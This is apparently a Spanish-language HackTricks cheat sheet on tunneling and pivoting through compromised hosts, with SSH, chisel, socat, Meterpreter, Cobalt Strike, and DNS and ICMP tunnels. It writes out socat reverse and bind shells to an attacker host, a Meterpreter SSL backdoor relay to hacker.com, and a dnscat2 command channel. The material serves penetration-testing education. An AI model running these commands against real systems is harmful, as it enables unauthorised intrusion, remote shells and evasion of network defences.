# Tunelización y Reenvío de Puertos

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión del PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

**Grupo de Seguridad Try Hard**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## Consejo de Nmap

{% hint style="warning" %}
Las exploraciones de **ICMP** y **SYN** no pueden ser tunelizadas a través de proxies socks, por lo que debemos **desactivar el descubrimiento de ping** (`-Pn`) y especificar **exploraciones TCP** (`-sT`) para que funcione.
{% endhint %}

## **Bash**

**Host -> Salto -> InternoA -> InternoB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

Conexión gráfica SSH (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Puerto Local a Puerto

Abrir un nuevo puerto en el servidor SSH --> Otro puerto
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Puerto a Puerto

Puerto local --> Host comprometido (SSH) --> Tercer\_caja:Puerto
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Puerto local --> Host comprometido (SSH) --> Donde sea
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reenvío de Puertos Inverso

Esto es útil para obtener shells inversos de hosts internos a través de una zona desmilitarizada (DMZ) hacia tu host:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and caputure it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Túnel

Necesitas **root en ambos dispositivos** (ya que vas a crear nuevas interfaces) y la configuración de sshd tiene que permitir el inicio de sesión como root:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ifconfig tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ifconfig tun0 up #Activate the server side network interface
```
Habilitar el reenvío en el lado del Servidor
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Establecer una nueva ruta en el lado del cliente
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
## SSHUTTLE

Puedes **tunelizar** todo el **tráfico** a una **subred** a través de un host usando **ssh**.\
Por ejemplo, reenviar todo el tráfico que va hacia 10.10.10.0/24
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Conectar con una clave privada
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Puerto a Puerto

Puerto local --> Host comprometido (sesión activa) --> Tercer\_equipo:Puerto
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS

SOCKS (Socket Secure) es un protocolo de red que permite el enrutamiento de paquetes entre un cliente y un servidor a través de un servidor proxy. SOCKS opera en la capa 5 del modelo OSI, lo que significa que puede manejar solicitudes de red a nivel de aplicación, como HTTP, FTP, SMTP, etc. SOCKS proporciona una forma de encapsular el tráfico de red para enviarlo a través de un proxy.
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Otra forma:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### Proxy SOCKS

Abra un puerto en el teamserver escuchando en todas las interfaces que se pueden usar para **enrutar el tráfico a través del beacon**.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

{% hint style="warning" %}
En este caso, el **puerto se abre en el host del beacon**, no en el Servidor del Equipo y el tráfico se envía al Servidor del Equipo y desde allí al host:puerto indicado.
{% endhint %}
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
### rPort2Port local

{% hint style="warning" %}
En este caso, el **puerto se abre en el host de Beacon**, no en el Servidor de Equipo y el **tráfico se envía al cliente de Cobalt Strike** (no al Servidor de Equipo) y desde allí al host:puerto indicado.
{% endhint %}
```
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Necesitas subir un archivo web de túnel: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Cincel

Puedes descargarlo desde la página de versiones de [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Necesitas usar la **misma versión para el cliente y el servidor**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Reenvío de puertos
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Túnel inverso. El túnel se inicia desde la víctima.\
Se crea un proxy socks4 en 127.0.0.1:1080
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivote a través de un proxy **NTLM**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Conexión de escucha
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Shell inversa
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Puerto a Puerto
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Puerto a puerto a través de socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter a través de SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Puedes evitar un **proxy no autenticado** ejecutando esta línea en lugar de la última en la consola de la víctima:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### Túnel SSL con Socat

**Consola /bin/sh**

Crear certificados en ambos lados: Cliente y Servidor
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Puerto a Puerto Remoto

Conecta el puerto SSH local (22) al puerto 443 del host atacante
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Es como una versión de consola de PuTTY (las opciones son muy similares a las de un cliente ssh).

Dado que este binario se ejecutará en la víctima y es un cliente ssh, necesitamos abrir nuestro servicio ssh y puerto para poder tener una conexión inversa. Luego, para reenviar solo el puerto accesible localmente a un puerto en nuestra máquina:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Puerto a puerto

Necesitas ser un administrador local (para cualquier puerto)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Necesitas tener **acceso RDP sobre el sistema**.\
Descarga:

1. [Binarios SocksOverRDP x64](https://github.com/nccgroup/SocksOverRDP/releases) - Esta herramienta utiliza `Canales Virtuales Dinámicos` (`DVC`) del servicio de Escritorio Remoto de Windows. DVC es responsable de **tunelizar paquetes sobre la conexión RDP**.
2. [Binario Portátil de Proxifier](https://www.proxifier.com/download/#win-tab)

En tu computadora cliente carga **`SocksOverRDP-Plugin.dll`** de esta manera:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Ahora podemos **conectarnos** a la **víctima** a través de **RDP** usando **`mstsc.exe`**, y deberíamos recibir un **aviso** que indique que el complemento **SocksOverRDP está habilitado**, y estará **escuchando** en **127.0.0.1:1080**.

**Conéctate** a través de **RDP** y carga y ejecuta en la máquina de la víctima el binario `SocksOverRDP-Server.exe`:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Ahora, confirma en tu máquina (atacante) que el puerto 1080 está escuchando:
```
netstat -antb | findstr 1080
```
Ahora puedes usar [**Proxifier**](https://www.proxifier.com/) **para enrutar el tráfico a través de ese puerto.**

## Proxificar aplicaciones GUI de Windows

Puedes hacer que las aplicaciones GUI de Windows naveguen a través de un proxy usando [**Proxifier**](https://www.proxifier.com/).\
En **Profile -> Proxy Servers** agrega la IP y el puerto del servidor SOCKS.\
En **Profile -> Proxification Rules** agrega el nombre del programa a proxificar y las conexiones a las IPs que deseas proxificar.

## Bypass de proxy NTLM

La herramienta mencionada anteriormente: **Rpivot**\
**OpenVPN** también puede evitarlo, configurando estas opciones en el archivo de configuración:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Autentica contra un proxy y enlaza un puerto local que se reenvía al servicio externo que especifiques. Luego, puedes utilizar la herramienta que elijas a través de este puerto.\
Por ejemplo, reenviar el puerto 443.
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Ahora, si configuras, por ejemplo, en la víctima el servicio **SSH** para escuchar en el puerto 443. Puedes conectarte a través del puerto 2222 del atacante.\
También podrías usar un **meterpreter** que se conecta a localhost:443 y el atacante está escuchando en el puerto 2222.

## YARP

Un proxy inverso creado por Microsoft. Puedes encontrarlo aquí: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Se necesita acceso de root en ambos sistemas para crear adaptadores tun y tunelizar datos entre ellos utilizando consultas DNS.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
El túnel será muy lento. Puedes crear una conexión SSH comprimida a través de este túnel utilizando:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Descárgalo desde aquí**](https://github.com/iagox86/dnscat2)**.**

Establece un canal C\&C a través de DNS. No necesita privilegios de root.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **En PowerShell**

Puedes usar [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) para ejecutar un cliente dnscat2 en PowerShell:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Reenvío de puertos con dnscat**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Cambiar el DNS de proxychains

Proxychains intercepta la llamada `gethostbyname` de la biblioteca libc y canaliza la solicitud de DNS tcp a través del proxy socks. Por **defecto**, el servidor **DNS** que usa proxychains es **4.2.2.2** (codificado). Para cambiarlo, edita el archivo: _/usr/lib/proxychains3/proxyresolv_ y cambia la IP. Si estás en un entorno de **Windows**, podrías configurar la IP del **controlador de dominio**.

## Túneles en Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

## Túneles ICMP

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Se necesita acceso de root en ambos sistemas para crear adaptadores tun y canalizar datos entre ellos utilizando solicitudes de eco ICMP.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Descárgalo desde aquí**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

**[ngrok](https://ngrok.com/) es una herramienta para exponer soluciones a Internet en una sola línea de comando.**
*Las URI de exposición son como:* **UID.ngrok.io**

### Instalación

- Crear una cuenta: https://ngrok.com/signup
- Descarga del cliente:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Usos básicos

**Documentación:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

*También es posible agregar autenticación y TLS, si es necesario.*

#### Túneles TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Exponiendo archivos con HTTP
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Intercepción de llamadas HTTP

*Útil para XSS, SSRF, SSTI ...*
Directamente desde stdout o en la interfaz HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Túneles de servicio HTTP internos
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### Ejemplo de configuración simple de ngrok.yaml

Abre 3 túneles:
- 2 TCP
- 1 HTTP con exposición de archivos estáticos desde /tmp/httpbin/
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Otras herramientas para verificar

* [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
* [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

**Grupo de Seguridad Try Hard**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión del PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
